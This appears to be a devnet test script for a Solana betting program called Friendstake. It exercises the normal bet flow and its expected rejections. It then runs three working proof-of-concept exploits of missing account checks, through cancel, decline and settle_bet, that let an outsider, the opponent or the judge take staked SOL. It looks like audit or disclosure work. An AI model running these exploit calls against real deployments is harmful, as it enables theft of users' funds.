// Friendstake (peer-to-peer betting) on devnet: make, take, judge settles; the rejections; and three missing account checks.
// Mirrors the app's calls (app/friendstake/web/components/bet/bet-data-access.tsx).
// Usage (from app/friendstake, @coral-xyz/anchor 0.29): node friendstake.mjs <idl.json> <rpc> <payer.json>
// The payer funds four fresh keys (M = maker, O = opponent, J = judge, X = outsider) and gets the unspent SOL back at the end.
import fs from 'fs';
import anchor from '@coral-xyz/anchor';
import { Connection, Keypair, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL, sendAndConfirmTransaction } from '@solana/web3.js';
const { AnchorProvider, Program, Wallet, BN } = anchor;
const [idlPath, rpc, payerPath] = process.argv.slice(2);
const rlFetch = async (url, opts) => { for (let i = 0; ; i++) { const r = await fetch(url, opts); if ((r.status !== 429 && r.status < 500) || i >= 12) return r; await new Promise(z => setTimeout(z, 1500 * (i + 1))); } };
const conn = new Connection(rpc, { commitment: 'confirmed', fetch: rlFetch, disableRetryOnRateLimit: true });
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
conn.confirmTransaction = async (arg) => { const sig = typeof arg === 'string' ? arg : arg.signature;
  for (let i = 0; i < 90; i++) { const st = (await conn.getSignatureStatuses([sig])).value[0];
    if (st && (st.confirmationStatus === 'confirmed' || st.confirmationStatus === 'finalized')) {
      if (st.err) throw new Error('tx failed ' + JSON.stringify(st.err)); return { context: { slot: st.slot }, value: { err: st.err } }; }
    await sleep(1000); } throw new Error('confirm timeout ' + sig); };
const kp = (p) => Keypair.fromSecretKey(Uint8Array.from(JSON.parse(fs.readFileSync(p, 'utf8'))));
const idl = JSON.parse(fs.readFileSync(idlPath, 'utf8')); const pid = new PublicKey(idl.metadata.address);
const prog = (k) => new Program(idl, pid, new AnchorProvider(conn, new Wallet(k), { commitment: 'confirmed' }));
const log = (o) => console.log(JSON.stringify(o));
const err = (e) => String(e.error?.errorCode?.code || e.logs?.find(l => /Error|failed|already in use|insufficient/i.test(l)) || e.message).split('\n')[0].slice(0, 200);
const transient = (e) => /Backend error|StatusCode: 5|fetch failed|ECONNRESET|blockhash/i.test(String(e?.message || e));
const retry = async (fn) => { for (let i = 0; ; i++) { try { return await fn(); } catch (e) { if (!transient(e) || i >= 6) throw e; await sleep(4000 * (i + 1)); } } };
const expectFail = async (label, fn0) => { const fn = () => retry(fn0); try { const s = await fn(); log({ step: label, ok: false, error: 'UNEXPECTED SUCCESS', sig: s }); } catch (e) { log({ step: label, expectedFailure: true, error: err(e) }); } };
const SOL = LAMPORTS_PER_SOL; const payer = kp(payerPath);
const M = Keypair.generate(), O = Keypair.generate(), J = Keypair.generate(), X = Keypair.generate(); const keyDir = payerPath.replace(/[^/]*$/, '');
const tag = M.publicKey.toBase58().slice(0, 6);
for (const [n, k] of [['M', M], ['O', O], ['J', J], ['X', X]]) try { fs.writeFileSync(`${process.env.ROLE_KEY_DIR || keyDir}friendstake-${n}-${tag}.json`, JSON.stringify(Array.from(k.secretKey)), { mode: 0o600 }); } catch {}
const betOf = (m, o, j, d) => PublicKey.findProgramAddressSync([Buffer.from('bet'), m.toBuffer(), o.toBuffer(), j.toBuffer(), Buffer.from(d)], pid)[0];
const vaultOf = (b) => PublicKey.findProgramAddressSync([Buffer.from('vault'), b.toBuffer()], pid)[0];
const sys = SystemProgram.programId; const AMT = 0.01 * SOL;
const bal = async (k) => conn.getBalance(k.publicKey ?? k);
log({ step: 'setup', program: pid.toBase58(), M: M.publicKey.toBase58(), O: O.publicKey.toBase58(), J: J.publicKey.toBase58(), X: X.publicKey.toBase58() });
log({ step: 'fund M 0.07, O 0.035, J 0.01, X 0.01 SOL', sig: await sendAndConfirmTransaction(conn, new Transaction().add(
  SystemProgram.transfer({ fromPubkey: payer.publicKey, toPubkey: M.publicKey, lamports: 0.07 * SOL }),
  SystemProgram.transfer({ fromPubkey: payer.publicKey, toPubkey: O.publicKey, lamports: 0.035 * SOL }),
  SystemProgram.transfer({ fromPubkey: payer.publicKey, toPubkey: J.publicKey, lamports: 0.01 * SOL }),
  SystemProgram.transfer({ fromPubkey: payer.publicKey, toPubkey: X.publicKey, lamports: 0.01 * SOL })), [payer], { commitment: 'confirmed' }) });
const make = (d) => { const bet = betOf(M.publicKey, O.publicKey, J.publicKey, d);
  return prog(M).methods.make(d, new BN(AMT)).accounts({ maker: M.publicKey, opponent: O.publicKey, judge: J.publicKey, bet, vault: vaultOf(bet), systemProgram: sys }).rpc(); };
const take = (k, d) => { const bet = betOf(M.publicKey, O.publicKey, J.publicKey, d);
  return prog(k).methods.take().accounts({ opponent: k.publicKey, maker: M.publicKey, judge: J.publicKey, bet, vault: vaultOf(bet), systemProgram: sys }).rpc(); };
const settle = (k, d, w, maker = M.publicKey, taker = O.publicKey) => { const bet = betOf(M.publicKey, O.publicKey, J.publicKey, d);
  return prog(k).methods.settleBet(w).accounts({ judge: k.publicKey, maker, taker, bet, vault: vaultOf(bet), systemProgram: sys }).rpc(); };
const cancel = (k, d) => { const bet = betOf(M.publicKey, O.publicKey, J.publicKey, d);
  return prog(k).methods.cancel().accounts({ maker: k.publicKey, opponent: O.publicKey, judge: J.publicKey, bet, vault: vaultOf(bet), systemProgram: sys }).rpc(); };
const decline = (k, d, maker) => { const bet = betOf(M.publicKey, O.publicKey, J.publicKey, d);
  return prog(k).methods.decline().accounts({ opponent: k.publicKey, maker, bet, vault: vaultOf(bet), systemProgram: sys }).rpc(); };
// 1. the normal path
log({ step: 'M makes bet "match" against O with J as judge, staking 0.01 SOL', ok: true, sig: await retry(() => make('match')), bet: betOf(M.publicKey, O.publicKey, J.publicKey, 'match').toBase58() });
await expectFail('M makes the same bet again (same PDA)', () => make('match'));
await expectFail('X takes the bet (only the named opponent can)', () => take(X, 'match'));
await expectFail('J settles before O has taken the bet', () => settle(J, 'match', 1));
log({ step: 'O takes the bet, matching 0.01 SOL', ok: true, sig: await retry(() => take(O, 'match')) });
await expectFail('M cancels after O has taken it', () => cancel(M, 'match'));
await expectFail('O declines after taking it', () => decline(O, 'match', M.publicKey));
await expectFail('X settles the bet (only the judge can)', () => settle(X, 'match', 1));
let o0 = await bal(O);
log({ step: 'J settles the bet for the taker (winner = 2)', ok: true, sig: await retry(() => settle(J, 'match', 2)) });
log({ step: 'O balance change from the settlement', O_gain_sol: ((await bal(O)) - o0) / SOL });
// 2. missing account checks
log({ step: 'M makes bet "open" (0.01 SOL), not yet taken', ok: true, sig: await retry(() => make('open')) });
let x0 = await bal(X);
log({ step: 'BUG: X calls cancel on M\'s open bet, passing itself as maker (cancel never checks maker against bet.maker)', ok: true, sig: await retry(() => cancel(X, 'open')) });
log({ step: 'X balance change (M\'s stake plus the bet account rent, minus the fee)', X_gain_sol: ((await bal(X)) - x0) / SOL });
log({ step: 'M makes bet "decl" (0.01 SOL)', ok: true, sig: await retry(() => make('decl')) });
o0 = await bal(O);
log({ step: 'BUG: O declines but passes itself as maker (decline never checks maker against bet.maker)', ok: true, sig: await retry(() => decline(O, 'decl', O.publicKey)) });
log({ step: 'O balance change (M\'s refund and the bet rent go to O)', O_gain_sol: ((await bal(O)) - o0) / SOL });
log({ step: 'M makes bet "judge" (0.01 SOL)', ok: true, sig: await retry(() => make('judge')) });
log({ step: 'O takes bet "judge"', ok: true, sig: await retry(() => take(O, 'judge')) });
let j0 = await bal(J);
log({ step: 'BUG: J settles "maker wins" but passes its own wallet as maker (settle_bet never checks maker/taker against the bet)', ok: true, sig: await retry(() => settle(J, 'judge', 1, J.publicKey, O.publicKey)) });
log({ step: 'J balance change (the whole 0.02 SOL pot plus the bet rent)', J_gain_sol: ((await bal(J)) - j0) / SOL });
for (const k of [M, O, J, X]) { const b = await bal(k); if (b > 10000)
  log({ step: 'return unspent SOL to the payer', from: k.publicKey.toBase58(), sol: (b - 5000) / SOL,
    sig: await retry(() => sendAndConfirmTransaction(conn, new Transaction().add(SystemProgram.transfer({ fromPubkey: k.publicKey, toPubkey: payer.publicKey, lamports: b - 5000 })), [k], { commitment: 'confirmed' })) }); }
